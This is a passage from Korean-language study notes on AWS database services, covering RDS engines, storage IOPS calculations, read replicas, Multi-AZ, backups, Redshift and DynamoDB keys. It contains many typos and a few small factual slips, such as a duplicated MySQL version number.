때문이다.\n  OLTP 데이터베이스는 1분당 수백 건의 주문을 처리해야 하는 온라인 주문 시스템을 지원하는 데 적합하다.\n    OLAP    OLAP 데이터베이스는 복잡한 대형 데이터 세트 쿼리에 최적화 되어 있으며, 상단하 스토리지와 컴퓨팅이 필요하여 데이터웨어하우징 애플리케이션으르 구축하여 여러 OLTP 데이터베이스를 단일 OLAP 데이터베이스로 모으는 것이 일반적이다.\n  보통 대형 OLAP 데이터베이스에서는 복잡한 쿼리로 인한 컴퓨팅 부하를 여러 데이터베이스 서버가 나눠 처리하며, 파티셔닝이라는 프로세스에서 각 서버는 데이터베이스 일부를 맡아 처리한다.\n     Amazone Relational Database Server ( 이하 RDS )    RDS는 클라우드에서 관계형 데이터베이스 시스템을 실행할 수 있게 하는 관리형 데이터베이스 서비스로, 데이터베이스 시스템 설정, 백업 수행, 고 가용성 보장, 데이터베이스와 기반 운영체제 패치 적용 등과 같은 작업을 수행한다.\n  RDS를 사용하면 데이터베이스 장애로부터 복구, 데이터 복원, 데이터베이스 확장을 쉽게 사용하여 애플리케이션이 요구하는 수준의 가용성과 성능을 달성할 수 있다.\n  RDS를 사용해 데이터베이스를 배포할 때, 격리된 데이터베이스 환경인 데이터베이스 인스턴스 구성에서부 시작한다. 데이터베이스 인스턴스는 지정한 가상 프라이빗 클라우드(VPC)에 존재하나, EC2 인스턴스와는 다르게 AWS가 전적으로 데이터베이스 인스턴스를 관리한다. SSH를 사용해 엑세스할 수 없으며, EC2 인스턴스 사이에서도 보이지 않는다.\n     데이터베이스 엔진   데이터베이스 엔진은 데이터베이스에 데이터를 저장, 구성, 반환하는 소프트웨어이며, 데이터베이스 인스턴스는 하나의 데이터베이스 엔진만 실행한다.\n  RDS는 다음 여섯 가지 데이터베이스 엔진 중에서 선택할 수 있다.\n MySQL  MySQL은 블로그 및 전자상거래와 같은 OLTP 애플리케이션으로 설계되었으며, RDS는 5.5, 5.6, 5.6 등 최신 MySQL Community Edition 버전을 제공한다. MySQL은 myISAM과 InnoDB 두 가지 스토리지 엔진에서 하나를 선택할 수 있지만, 유일하게 RDS 관리형 자동 백업과 호환할 수 있는 엔진은 InnoDB이다.      Maria DB  Maria DB는 MySQL과 바이너리 수준의 호환성을 가지면서 기능을 향상한 데이터베이스이다. Maria DB는 오라클이 MySQL을 개발한 회사를 인수한 이후, MySQL의 미래를 우려해서 개발되었으며, MariaDB는 XtraDB와 InnoDB 스토리지 엔진을 지원하지만, AWS에서는 RDS와의 호환성을 최대화하기 위해 InnoDB를 사용할 것이 권장된다.      Oracle  Oracle은 가장 널리된 DBMS로 일부 애플리케이션은 데이터베이스사양으로 Oracle을 데이터베이스로 명시하기도 한다. RDS는 다음 Oracle 데이터베이스 에디션을 제공한다. Standare Edition One(SE1) Standare Edition Two(SE2) Standare Edition(SE) Enterprise Edition One(SE)      PostgreSQL  PostgreSQL은 Oracle과 호환되는 오픈 소스 데이터베이스이며, Oracle 기반으로 애플리케이션을 제작하였어도, 비용을 위해 PostgreSQL을 선택하기도 한다.      Amazone Aurora  Amazon Aurora는 Amazon이 MySQL과 PostgreSQL과 바이이너리 수준의 호환성을 가지면서 기능을 향상시킨 데이터베이스이며, 가상 스토리지 계층을 사용해서 하부 스토리지 쓰기 횟수를 줄이기 때문에 MySQL, PostgreSQL보다 쓰기 성능이 우수하며 하단의 세 가디 에디션을 제공한다. MySQL 5.6-compatible MySQL 5.7-compatible PostgreSQL compatible Aurora는 에디션에 따라서 PostgreSQL이나 MySQL과 부러오기/ 내보내기 도구, 스냅샷에서 호환되며, 두 오픈 소스 데이터베이스에서 언할하게 마이그레이션 할 수 있도록 설게되어 있다. Aurora는 MySQL 호한 에디션에서 InnoDB 스토리지 엔진만 지원하며, MySQL에서 사용할 수 있는 Aurora Backtrack 기능으로 데이터베이스를 지난 72시간 이내 특정 시점으로 단 몇 초 만에 복구가 가능하다.      Microsoft SQL Server  여러 Microsoft SQL Server과 Express, Web, Standard, Enterprise 에디션을 사용할 수 있으며, 다양한 기능을 사용해서 데이터베이스 업그레이드를 수행하지 않고도 온프레미스에 배포된 기존 SQL 데이터베이스를 RDS로 마이그레이션 할 수 있다.           라이센스 고려사항   RDS는 데이터베이스 엔진을 실행하는 데 필요한 두 가지 소프트웨어 라이선스 모델을 제공하며, 라이센스가 포함된 모델은 RDS 인스턴스 요금에 라이센스 비용이 포함되여 제공된다.\n  기존 보유 라이센스 사용(BTOL : Bring Your Own License)모델을 선택하려면 실행 중인 데이터베이스 엔진의 라이센스를 확보해야 한다.\n  라이센스가 포함된 모델 MariaDB나 MySQL은 GNU GPL(General Public License)v2.0을 사용하며, PostgreSQL은 PostgreSQL 라이선스를 사용하고, 별도의 라이선스 비용은 없다.\n  RDS에서 실행하는 Microsoft SQL 서버의 모든 버전과 에디션은 라이선스를 포함하며, Oracle Database Standard Edition One과 Oracle Database Standard Edition Tow도 라이선스를 포함하고 있다.\n       데이터베이스 옵션 그룹   데이터베이스 엔진은 데이터베이스 관리와 보안 향상을 지원하는 다양한 기능을 제공한다.\n  옵션 그룹은 옵션이라는 관리 및 보안 기능을 지정해서 하나 이상의 인스턴스에 적용할 수 있게 한다.\n  옵션을 사용하려면 메모리가 더 필요하므로 인스턴스에 충반한 메모리가 있는지 확인하고 필요한 것만 활성화 해야한다.\n  옵션 그룹에서 사용 가능한 옵션들은 데이터베이스 엔진마다 다르며, Microsoft SQL Server와 Oracle은 TDE를 제공해 스토리지에 쓰기를 수행하기 전에 엔진이 데이터를 암호화하게 한다.\n  MySQL과 MariaDB는 데이터베이스 사용자 로그인 쿼리 활동을 기록하게 하는 감사 플러그인을 제공한다.\n       데이터베이스 인스턴스 클래스   데이터베이스 인스턴스를 시작할 때 처리 성능, 메모리, 네트워크 대역폭, 디스크 처리량이 어느 정도 필요한지를 결정해야 하며, RDS는 여러 데이터베이스를 다양한 성능 요구 사항을 충족하기 위해 다양한 데이터베이스 인스턴스 클래스를 제공한다.\n  선택을 잘못 했거나 요구 사항이 변경될 때 인스턴스를 다른 클래스로 전환할 수도 있으며, RDS 데이터베이스 인스턴스 클래스를 다음의 세 가지 유형으로 분류한다.\n    표준  256G 메모리 64v CPU 25Gbps 네트워크 대역폭 10.000Mbps(1.280Mbps) 디스크 처리량      메모리 최적화 (대용량의 처리량)  3.940GB 메모라 128 vCPU 25Gbps 네트워크 대역폭 14.000Mbps(1.750P 디스크 처리향      순간확장 가능 (개발 및 테스트 용도)  32GB 메모리 8 vCPU         스토리지   데이터베이스 인스턴스에 적합한 스토리지 선택은 충분한 디스크 공간 확보 이상으로 중요하다.\n  데이터베이스 기반 애플리케이션의 성능 요구사항을 충족하기 위해서는 얼마나 빠른 스토리지를 선택할지도 판단해야 한다.\n       IOPS의 이해   AWS는 초당 입력/ 출력 작업(IOPS, Input/ Output Operations Per Second)를 사용해 스토리지 성능을 측정한다.\n  입출력 작업은 스토리지 읽기 또는 쓰기 작업으로 다른 모든 조건이 같을 때, IOPS가 큰 데이터베이스는 데이터를 저장하고 검색하는 속도가 더 빠르다.\n  RDS는 스토리지 타입에 따라 IOPS를 할당할 수 있으나, 임계 값을 초과할 수는 없다.\n  데이터베이스 스토리지의 속도는 할당된 IOPS 수에 제한되며, 단일 I/O 작업에서 전송할 수 있는 데이터의 양은 데이터베이스 엔진이 사용하는 페이지 크기에 달려 있어, 요구되는 IOPS 수준을 파악하려면 먼저 필요한 디스크 처리량을 확인해야 한다.\n  MySQL과 MariaDB의 페이지 크기는 16KB이므로, 디스크에 16KB의 데이터 쓰기가 하나의 I/O 작업을 구성한다.\n  반면 Oracle, PostgreSQL, Microsoft SQL Server는 8KB 크기의 페이지를 사용하며, 이 경우 16KB의 데이터를 쓰면 I/O 작업이 두 번 이루어진다.\n  페이지 크기가 클수록 단일 I/O 작업에서 더 많은 데이터를 전송할 수 있다.\n  페이지의 크기가 16KB라고 하고, 데이터베이스가 초당 102,400KB(100MB)의 데이터를 읽어야 한다고 할 때, 이러한 성능 요구를 달성하려먼 데이터베이스는 매초 16KB 페이지 크기로 6,400 페이지를 읽어여 하며, 페이지 당 I/O 작업 하나로 계산하기 때문에 스토리지와 인스턴스 클래스는 6,400 IOPS를 유지해야 한다. 이 때, IOPS 수와 페이지 크기는 반비례 관계이며, 페이지가 클 수록 같은 처리량을 달성하는 데 필요한 IOPS는 작아진다.\n       스토리지 유형에 따라 IOPS 수가 달라지며, RDS는 다음 세가 유형의 스토리지를 제공한다.  범용 SSD   데이터베이스의 대부분은 범용 SSD(gp2) 스토리지로 충분하다.\n  범용SSD 스토리지는 속도가 빠르고 한 자릿수 밀리초 지연 시간을 제공하며, 최대 16TB의 보륨을 할당할 수 있다.\n  RDS는 기본적으로 기가바이트당 3 IOPS 성능을 볼륨에 할당하며, 최대 10,000 IOPS까지 볼륨을 할당할 수 있다.\n  볼륨이 커지면 성능이 향상되며, 데이터베이스 엔진의 따라 만들 수 있는 스토리지 볼륨의 최소 크기는 다르다.\n  gp2 스토리지 유형의 최대 처리량은 1,280(160MB)이며, 최대 처리량을 만족하기 위해서는 인스턴스가 적어도 1,280(160MB) 이상의 디스크를 지원할 수 있어여 하며, 처리량을 유지하기 위해 IOPS를 할당해야 한다.\n  예시로 Maria DB를 16KB 페이지 크기로 실행한다고 가저하였을 때, 1,280Mbps 디스크 처리량을 유지하는 데 필요한 IOPS 수는 1,280MBPS/0.128MB = 10,000 IOPS이다.\n  즉, 볼륨에서 1,280Mbps의 디스크 처리량을 달성하려면 10,000 IOPS가 할당되어야 하며, 이것은 gp2에서 할당 가능한 최대 IOPS 수라는 것에 주목한다. 이것을 다시 계산해보면 이 정도의 IOPS를 확보라혀면 볼륨 크기가 3,333,3GB(3.34TB)가 되어야한다.\n  최대 3,000 IOPS가 필요하지만 그렇게 큰 스토리지가 필요하지 않을 때, 필요한 IOPS를 얻기 위해서는 스토리지를 과도하게 할당할 필요는 없다. 1TB보다 작은 볼륨은 일시적으로 3,000 IOPS까지 순간 확장이 가능하며, 순간 확장 지속 시간은 다음과 같은 공식으로 결정된다.\n  순간 확장 지속시간(초) = (Credit 잔약)/[3,000 - 3 X (저장용량(GB))]\n  데이터베이스 인스턴스를 처음 부팅할 때, 5,400,000 IOPS의 Credit 잔액을 갖게 되며 인스턴스가 기준치 이상으로 IOPS를 사용하면 그 만큼 Credit 잔액이 차감된다.\n  Credit 잔액이 고갈되면 순간 확장 기능을 사용할 수 없으며, 예를 들어 200GB 볼륨의 순간 확장 지속시간은 2,250초(37.5분)이다.\n  Creidt 잔액은 1초마다 IOPS 기준치가 보충된다.\n        프로비저닝된 IOPS SSD(io1)   앞에 나온 식이 복잡하다면 프로비저닝된 IOPS SSD를 사용하면 인스턴스를 만들 때 필요한 IOPS 수를 간단하게 할당할 수 있다.\n  io1 스토리지에서는 순간 확장의 개념이 없으며, 프로비저닝된 IOPS 수는 사용 여부와 관계없이 일정한 성능이 제공되고 그에 따른 비용이 청구되므로, 일관된 짧은 지연 시간에 성능이 필요한 OLTP 데이터베이스에 유용하다.\n  표준 또는 메모리 최적화 인스턴스 클래스를 사용할 때, RDS는 프로비저닝된 IOPS의 성능 변동 범위가 10% 이내로 유지되는 기간을 1년의 99.9%로 보장한다.\n  즉 지정한 IOPS 수보다 낮은 성능이 제공되는 기간이 1년 동안 약 2시간 45분밖에 안 된다는 의미이기도 하다.\n  4,000Mbps 처리량의 표준 인스턴스와 16KB 페이지 크기의 데이터베이스 엔진을 사용한다고 가정하면 최대 31,250 IOPS를 달성할 수 있으며, 이러한 성능을 달성하려면 인스턴스를 생성할 때 32,000 IOPS를 프로비저닝해야 하며, 프로비전이된 IOPS는 1,000단윈로 지정할 수 있다.\n  데이터베이스 엔진에 따라 달성할 수 있는 최대 IOPS 수와 할당할 수 있는 스토리지 크기가 다르며, Oracle, PostgreSQL, MariaDB, MySQL, Aurora를 사용하면 100GB ~ 16TB의 스토리지를 선택할 수 있고, 1,000~ 4,000 프로비저닝된 IOPS를 할당할 수 있다.\n  Microsoft SQL Server는 최대 16TB 스토리지를 제공한고 1,000~ 32,000 범위의 프로비저닝된 IOPS를 제공한다.\n  IOPS 기가바이트 비율은 최소 50:1(IOPS:GB)이어야 하며, 32,000 IOPS가 필요하다면 최소 640GB의 스토리지를 제공해야 한다.\n      마그네틱 스토리지  마그네틱 스토리지는 RDS 구형 인스턴스의 호환성을 위해 제공되며 최대 크기는 4TB, 최대 성능은 1,000 IOPS이다.       읽기 전용 복제본    데이터베이스 인스턴스가 성능 요구 사항을 충족하지 못할 때, 병목 현상 발생 위치에 따라 해결 방법을 적용할 수 있다.\n  만약 메모리, 컴퓨팅, 네트워크 속도, 디스크 처리량에 문제가 발생 시에 인스턴스 클래스를 업그레이드 하여 데이터베이스를 확장할 수 있는 데 이를 수직확장(Scale Up)이라 한다.\n  리소스를 증가시키는 수직확장 외에 읽기 전용 복제본이라는 추가 데이터베이스 인스턴스를 생성하는 작업을 수행하는 것을 수평확장(Scale Out)이라 한다.\n  수평확장은 Oracle과 Microsoft SQL Server를 제외한 모든 데이터베이스 엔진에 읽기 전용 복제본을 지원하며, Aurora에는 Aurora 복제본이라는 특정 유형의 읽기 전용 복제본이 존재한다.\n  읽기 전용 복제본은 데이터베이스 쿼리만 제공하는 데이터베이스 인스턴스로, 마스터 데이터베이스 인스턴스의 쿼리 부하 부분을 맡는다.\n  즉 마스터 데이터베이스 인스턴스는 데이터 쓰기만을 책임지게 되므로, 읽기 작업량이 매우 많은 애플리케이션에 적합하다.\n  RDS는 최대 5개 읽기 복제본을 둘 수 있으며, Aurora에서는 최대 15개까지 가능하다.\n  마스터로부터 모든 읽기 복제본에 비동기로 복제되므로, 데이터가 마스터 데이터베이스에 저장되는 시점과 그 데이터가 복제본에 저장되는 시점에는 지연이 발생한다.\n  지연이 발생하는 이유로 읽기 전용 복제본은 재해 복구에는 적합하지 않으며, MySQL의 경우 복제 지연 시간을 설정이 가능하다.\n  RDS는 읽기 전용 복제본을 만들면 도메인 이름을 제공하며, 이를 읽기 전용 엔드포인트라고 한다.\n  RDS의 읽기 전용 복제본이 다수 존재할 경우, 해당 복제본 중 하나에 연결해 로드 밸런싱하므로, 사용자는 데이터를 읽기만을 하는 분석 도구만 있다면 그 도구에 읽기 전용 엔드포인트를 지정해 주면 된다.\n  읽기 전용 복제본과 마스터는 서로 다른 가용 영역에 둘 수 있으며, 다른 리전에도 두는 것이 가능하다.\n  마스터 인스턴스는 장애가 발생했을 시에, 읽기 전용 복제본을 마스터로 승격시킬 수는 있지만, 비동기 복제의 특성이 존재하므로 어느 정도의 손실은 감수해야 한다.\n     고 가용성(다중-AZ)    데이터베이스 인스턴스가 중단되어도 데이터베이스를 계속 운영하려면, RDS의 다중 AZ배포를 통해 여러 가용 영역에 데이터베이스 인스턴스를 다수 배포한다.\n  다중 AZ 배포를 사용하면 한 가용 영역에 읽기 및 쓰기를 처리하는 기본 데이터베이스 인스턴스를 두고, 다른 가용 영역에는 예비 데이터베이스 인스턴스를 두게 되며, 기본 인스턴스가 중단되면 보통 2분 이내에 예비 인스턴스로 장애 조치가 수행된다.\n  하단은 인스턴스 중단의 대표적인 이유를 나타낸다.\n 가용 영역 중단 데이터베이스 인스턴스 유형 변경 인스턴스의 운영 체제 패치    데이터베이스 인스턴스를 만들 때나 만든 후라도 다중 AZ를 구성할 수 있다.\n  모든 데이터베이스 엔진은 다중 AZ를 지원하지만 구현 방식은 약간씩 다르며, 인스턴스를 만든 후에 다중 AZ를 활성화하면 성능이 상당히 떨어지므로 유지 관리 주기를 짧게 설정해야 한다.\n     Oracle, PostgreSQL, MariaDB, MySQL, Microsoft SQL Server의 다중-AZ   다중 AZ 배포시, 모든 인스턴스가 같은 리전에 존재해야 하며, RDS는 주 인스턴스에서 예비 인스턴스로 데이터를 동기식(Synchronously)으로 복제하며, 이 때 지연시간이 발생할 수 있으므로, EBS 최적화 인스턴스와 프로비저닝된 IOPS SSD 스토리지를 사용해야 한다.\n  예비 인스턴는 읽기 전용 복제본이 아니므로, 읽기 트래픽 처리가 불가능하다.\n  Oracle과 같이 기존 보유 라이선스(BYOL) 모델을 사용할 경우, 기본 인스턴스와 예비 인스턴스 모두 라이선스를 보유하고 있어야 한다.\n  MySQL과 MariaDB는 다른 리전에서 다중 AZ 읽기 전용 복제본을 만들 수 있으며, 다른 리전으로 장애 조치를 수행할 수 있다.\n       Amazon Aurora에서 다중-AZ   Amazon Aurora의 다중 AZ 구현 방식은 위에서 설명한 방식과는 차이가 있으며, Amazon Aurora 클러스트는 기본 인스턴스로 구성되며, 항상 기본 인스턴스를 가리키는 클러스터 엔드폰이트를 함께 제공한다.\n  Aurora 클러스터에는 Aurora 복제본도 포함될 수 있으며, 기본 복제본과 모든 복제본은 단일 클러스터 볼륨을 공유한다.\n  이 클러스터 볼륨은 3개 가용 영역에 동시에 복제되며, 필요에 따라 최대 64TB까지 자동으로 확장된다.\n  기본 인스턴스에 자애가 발생했을 때, Aurora 복제본이 없으면 Aurora는 새로운 기본 인스턴스를 생성하고, Aurora 복제본이 있으면 Aurora는 복제본을 기본 복제본으로 승격시킨다.\n       백업과 복구    RDS는 데이터베이스 인스턴스의 EBS 볼륨 스냇샷 기능을 제공한다. 일단 EBS 스냅샷처럼 인스턴스에 기반한 모든 데이터베이스는 스냅샷을 생성하여 S3에 저장할 수 있으며, 스냅샷은 중복성을 위해 같은 리전 여러 영역에 보관된다.\n  Microsoft SQL Server 이외의 데이터베이스 엔진에서는 다중 AZ를 사용하지 않는한 스냅샷을 하면 몇 초 동안 모든 I/O 작업이 일시 중단되므로 사용량이 적은 시간에 스냅샬을 생성해야 한다.\n  백업 및 복구가 필요할 때 고려해야할 두가지 지표가 존재한다.\n 복구 목표시간(Recovery Time Objective 이하 RTO)으로 장애 후 데이터르르 복구하고 처리를 재개하는 데까지 최대의 최대 허용시간을 의미한다. 복구 목표 지점(Recovery Point Object 이하 RPO)으로서 데이터 손실을 허용할 수 있는 최대 기간을 의미하며, RDS 백업 옵션을 선택할 때는 RTO, RPO 요구를 모두 고려해야 한다.    RDS 스냅샷을 복수할 때 스냅샷을 새 인스턴스로 복구하는데, 복구 시간은 몇 분정도도 걸리며 크기에 따라 차이가 존재한다.\n  새 인스턴스에 더 빠른 성능의 프로비저닝된 IOPS를 할당하면 복구 시간이 빨라진다.\n     자동화된 스냅샷    RDS는 매일 30분 백업 기간에 인스턴스 스냅샷을 자동 생성할 수 있으며, 이 기간은 사용자가 지정할 수도 있고 RDS가 자동으로 수행하게 할 수도 있다.\n  스냅샷을 진행하면 성능에 영향을 주기 때문에 데이터베이스가 가장 적게 사용되는 시간에 진행하는 것이 좋으며, RDS 백업을 진행하도록 설정하면, 리전마다 다르게 8시간 간격으로 80분 백업을 진행한다.\n  자동 백업을 사용하면 특정 시점 복구가 가능해지며, 데이터베이스 변경 로그를 5분마다 S3로 저장한다.\n  장애 이벤트가 발생하면 최대 5분 불량의 데이터만 손실이 발생하며, 특정 시점 복구는 몇 시간이 걸릴 수도 있으며, 트랜잭션 로그에 있는 데이터의 양에 따라 차이가 있다.\n  RDS는 자동화된 스냅샷을 일정 기간동안 유지하고, 기간이 지나면 삭제한다. 사용자는 1일에서 35일 사이의 보존 기간을 선택할 수 있으며, 기본 값은 7일이다.\n  자동 스냅샷을 사용하지 않으려면 보존 기간을 0으로 설정하고, 자동 스냅샷을 비활성화하면 기존의 자동화된 스냅샷 모두가 즉시 삭제되고, 특정 시점 복구가 비활성화된다.\n  보존 기간을 0에서 다른 값으로 변경하면 즉시 스냅샷이 트리거된다.\n  데이터베이스 인스턴스에 대해 수동으로 스냅샷을 수행할 수 있으며, 자동화된 스냅샷과 달리 수동 스냅샷은 삭제할 때까지 유지된다. 인스턴스를 삭제하면 사용자는 RDS의 최종 스냅샷 작업 수행 여부와 자동 스냅샷 여부를 선택하야 하고, 최종 스냅샷과 모든 수동 스냅샷은 유지되지만, 자동 백업을 유지하지 않기로 선택한다면 자동 스냅샷은 즉시 삭제된다.\n     유지 관리 항목    RDS는 관리형 서비스이므로 패치 및 업그레이드 처리는 AWS가 책임지며, 데이터베이스 인스턴스에서 운영 체제 보안과 안정성 패치 등의 유지 관리를 몇 달에 한 번씩 정기적으로 수행한다.\n  유지 관리 기간 동안 데이터베이스 엔진을 업그레이드 할 수도 있으며, AWS에서 새 버전의 데이터베이스 엔진을 지원하게 되면, 사용자는 새 버전 업그레이드를 결정할 수 있다.\n  메이저 버전 업그레이드는 이전 버전과 호환하지 않는 데이터베이스 변경 사항이 포함되어 있을 수 있으므로, 메이저 버전 업그레이드는 사용자가 직접 적용해야 한다.\n  AWS는 데이터베이스를 다시 빌드할 필요가 없는 nonbreaking 마이너 버전 번경을 적용한다.\n  유지 관리 기간을 매주 30분으로 지정해 유지 관리 작업이 수행되는 시기를 결정할 수 있으며, 유지 관리와 백업을 같은 기간에 지정할 수 있다. 유지 관리 기간을 30분으로 설정해도 작업은 유지 관리 기간을 넘어서 진행될 수도 있다.\n     Amazon Redshift    Redshift는 OLAP 데이터베이스를 위해 설계된 PostgreSQL 기반의 관리형 데이터베이스 웨어하우스 솔루션으로 RDS와는 별개의 서비스로 존재한다.\n  Redshfit는 열 기반 스토리지를 사용하므로, 저장 속도와 효율성이 향상되고 개별 열의 데이터를 더 빨리 쿼리할 수 있다.\n  Redshift는 ODBC와 JDBC 데이터베이스 커넥터를 지원한다.\n  Redshift는 압축 인코딩을 사용해 각 열의 스토리지에서 차지하는 크기를 줄이며, 수동으로 열 단위 압축을 수행할 수 있다.\n  COPY 명령을 사용해 파일에서 Redshift 데이터베이스로 데이터를 가져올 때 Redshift는 어떤 열을 압축할지 선택할 수 있다.\n      컴퓨팅 노드   Redshift 클러스터에는 두 가지 범주로 나눠진 하나 이상의 컴퓨터 노드가 있다. 고밀도는 컴퓨팅 노드의 마그네틱 스토리지에 최대 326TB 데이터를 저장할 수 있고, 고밀도 스토로지 노드의 고속 SSD에 최대 2PB 데이터를 저장할 수 있다.\n  둘 이상의 컴퓨팅 노드가 있을 때, Redshift에는 클라이언트와 통신하고 컴퓨팅 노드 간의 통신을 조정하는 리더 노드가 포함되어 있다. 이 리더 노드의 추가 비용은 없다.\n       데이터 분산 스타일   Redshift 데이터베이스의 행은 컴퓨팅 노드에 걸쳐 분산되며, 데이터가 분산되는 방식은 분산 스타일에 따라 다르다.\n  EVEN 분산은 기본 스타일이며 리더 노드가 데이터를 모든 컴퓨팅 노드에 걸쳐 고르게 분산시킨다.\n  KEY 분산은 열 1개 값에 따라 데이터를 분산시키며, 값은 값을 가진 열은 같은 노드에 저장된다.\n  ALL 분산에서는 테이블이 컴퓨팅 노드에 분산된다.\n       비관계형 데이터베이스 No-SQL    비관계형 데이터베이스는 초당 수만 개의 트랜잭션을 일관성 있게 처리하도록 설계되어 있다.\n  관계형 데이터베이스에서 다룰 수 있는 데이터를 저장할 수 있다 하더라도 비관계형 데이터베이스는 비정형 데이터라고 하는 것에 최적화 되어있다.\n  비정형의 데이터는 정형의 데이터가 아니라는 것을 설명하기 위해 사용되지만, 더 정확한 표현은 다중-정형 데이터라고 할 수 있다.\n  이와 같이 비관계형 데이터베이스에 저장하는 데이터의 형태는 다양하고 계속변경할 수 있다.\n  비관계형과 관계형 데이터베이스에는 공통된 요소가 존재핸다.\n  비관계형 데이터베이스는 No-SQL 데이터베이스라 불리며, 컬렉션으로 구성된다. 컬렉션은 때로는 테이블이라 불리기도 하며 관계형 데이터베이스에서 행 또는 튜플 개념과 유사한 항목이 테이블에 저장된다.\n  각 항목은 하나 이상의 속성으로 구성되며, 이 속성은 SQL 데이터베이스의 칼럼에 해당한다.\n  속성은 키, 데이터 형식, 값이라고 하는 고유한 이름으로 구성되며, 속성은 키-값 페어라고도 불린다.\n       데이터 저장   비관계형 데이터베이스가 관계형 데이터베이스와 다른 점은 스키마가 없으며, 테이블의 모든 항목이 같은 속성을 갖도록 요구하지 않는다는 것이다.\n  각 항목에는 테이블 내에서 고유한 값이 있는 기본 속성이 있어야 하는 데, 기본 키는 항목을 고유하게 식별하고 값에 따라 정렬하기 위해서 사용된다.\n  비관계형 데이터베이스는 저장 데이터 형식이 유연할 때 사용하며, 테이블을 만들 때 기본 키 속성 이외에는 속성을 미리 정의하지 않아도 되며, 항목을 작성하거나 수정할 때 바로 속성을 작성하는 데, 이 때 속성은 순서가 없고 서로 관계도 없으므로 비관계형이라고 부른다.\n  비관계형 데이터베이스에서는 여러 테이블에 걸쳐 데이터를 나눈 뒤 이 데이터를 병합해서 쿼리할 수 있는 방법이 없으므로, 애플리케이션은 모든 데이터를 하나의 테이블에 보관하는 경우가 많으며, 이는 중복으로 이어지고 데이터베이스가 커지면서 심각한 스토리지 비용을 발생시킬 수 있다.\n       데이터 쿼리   비관계형 데이터베이스는 비정형 데이터를 저장할 수 있는 유연성이 있지만, 쿼리가 제한돼 있다는 단점이 따르며, 기본 키 기반의 쿼리에 최적화 되어 있다.\n  다른 속성을 쿼리할 때 속도가 더 느려지므로 비관계형 데이터베이스는 복잡하거나 임의의 쿼리에는 적합하지 않으며, 테이블을 만들기 전에 데이터에 어떠한 쿼리를 수행할지 정확히 이해해야 한다.\n  하단의 표는 데이터 쿼리의 예시이다.\n       키 형식 값     사원 ID(기본 키) 숫자 101   부서 문자 전산실   성 문자 Smith   이름 문자 Charlotte     비관계형 데이터베이스에서 Charlotte라는 사원이 있는 모든 부서의 목록을 조회하는 것은 어려울 수 있으며, 사원 ID로 항목이 정렬되어 있으므로, 이름의 값이 Charlotte인 항목을 찾으려면 시스템은 모든 항목을 검색해야하는 문제점이 존재한다. 각 항목의 데이터들은 정형화되어 있지 않기 때문에, 모든 속성마다 검색해서 부서 속성이 포함된 항목을 판별해야 하며, 이러한 쿼리는 느릴 뿐 아니라 컴퓨팅 자원도 상당히 소모한다.     비관계형 데이터베이스 유형   비관계형 데이터베이스가 키-값 저장소, 문서 지향적 저장소, 그래프 데이터베이스 등으로 분류되며, 기본적으로는 모든 비관계형 데이터베이스는 키-값 저장소 데이터베이스이다.\n  문서 지향적 저장소는 값으로 지정된 문서의 내용을 분석하고 메타 데이터를 추출하는 특정한 비관계형 데이터베이스 애플리케이션이다.\n  그래프 데이터베이스는 여러 항목에 있는 속성 간의 관계를 분석하며, 이는 레코드간의 관계를 묶는 관계형 데이터베이스와는 다르다. 그래프 데이터베이스는 비정형 데이터에서 이와 같은 관계를 찾아낸다.\n       DynamoDB    DynamoDB는 초당 수천 개 읽기 및 쓰기를 처리할 수 있는 관리형 비관계형 데이터베이스 서비스로, 데이터를 여러 파티션에 걸쳐 분산시켜서 이러한 성능을 얻는다.\n  파티션은 테이블용 스토리지 할당으로, 여러 가용 영역의 SSD에 백업된다.\n     파티션/ 해시 키   테이블을 만들 때 기본 키와 데이터 형식을 지정해야 한다.\n  기본 키는 테이블의 항목을 고유하게 식별하므로, 값이 테이블 내에서 유일해야 하며, 하단과 같이 두 가지의 유형의 기본 키를 생성할 수 있다.\n  파티션 키는 해시키라고도 하며 단일 값을 가지는 기본 키며, 파티션 키만 기본 키로 사용할 때 이를 단순 기본 키라고 한다.\n  이메일 주소, 고유 사용자 이름, 임의로 생성한 ID 식별자 등이 파티션 키로 사용하기에 적합하며, 파티션 키로 저장할 수 있는 최대 크기는 2.048 바이트이다.\n  기본 키로 파티션 키와 정렬 키를 조합해서 사용할 수도 있으며, 이를 복합 키라 한다.\n  파티션 키는 고유할 필요는 없지만, 파티션 키와 정렬 키의 조합은 고유해야 하며, 사람이 성을 파티션 키로 이름을 정렬 키로 쓰는 예를 살펴보자. 이 방법으로 하면 테이블용 복합 키로 다음 값을 사용할 수 있디.\n         성(파티션 키) 이름(정렬 키)     Lewis Clive   Lewis Warren   Williams Warren      성 Lewis나 이름 Warren은 이 테이블에서 유일하지 않지만, 파티션 키와 정령 키를 함께 사용하면 고유한 기본 키를 생성 할 수 있다.\n  DynamoDB는 기본 키를 기반으로 파티션에 걸쳐 항목을 배포한다.\n  앞의 예에서 보면 성이 Lewis인 항목은 모두 같은 파티션에 저장되며, DynamoDB는 정렬 키를 사용해서 오름차순으로 항목을 정렬하고, 정렬 키로 저장할 수 있는 최대 크기는 1,024바이트이다.\n  대량의 읽기 쓰기 작업이 발생하는 파티션을 핫 파티션이라 하며, 이는 성능에 악영향을 끼친다.\n  핫 파티션이 되는 것을 피하려면 파티션 키를 최대한 고유하게 생성해야 한다.\n     속성과 항목   각 키-값 페어는 속성을 구성하고, 하나 이상의 속성은 항목을 구성한다. DynamoDB가 저정할 수 있는 항목의 최대 크기는 400KB이며, 이는 대략 50,000개의 영어 단어 수와 동일하다.\n  모든 항목은 최소한 기본 키와 키에 해당하는 값을 가지고 있으며, 속성을 생성할 때는 데이터 형식을 정하고, 하단과 같이 세 가지 범주로 정할 수 있다.\n  스칼라\n  문자열 데이터 형식은 UTF-8 인코딩을 사용해 최대 400KB의 유니코드 데이터를 저장할 수 있고, 문자열 길이는 0보다 커야 한다.\n  숫자 데이터 형식은 최대 38자리의 양수나 음수를 저장하며, DynamoDB는 앞과 끝의 0을 자른다.\n  바이너리 데이터 형식은 바이너리 데이터를 Base64 비트 인코딩 형식으로 저장하며, 문자열 형식과 마찬가지로 최대 항목 크기는 400KB로 제한한다.\n  부울 데이터 형식은 ture 또는 false 값을 저장할 수 있다.\n  null 데이터 형식은 정의되지 않았거나 알려지지 않은 속성을 나타내며, null 데이터 형식에는 null 값이 포함되어야 한다.\n    집합\n 집합 데이터 형식은 수서가 없는 스칼라 값 목록을 담고 있으며, 값은 집합 내에서 고유해야 하고, 집합에는 하나 이상의 값이 포함되어 있어야 하며, 숫자 집합, 문자열 집합, 바이너리 집합의 작성이 가능하다.    문서\n 문서 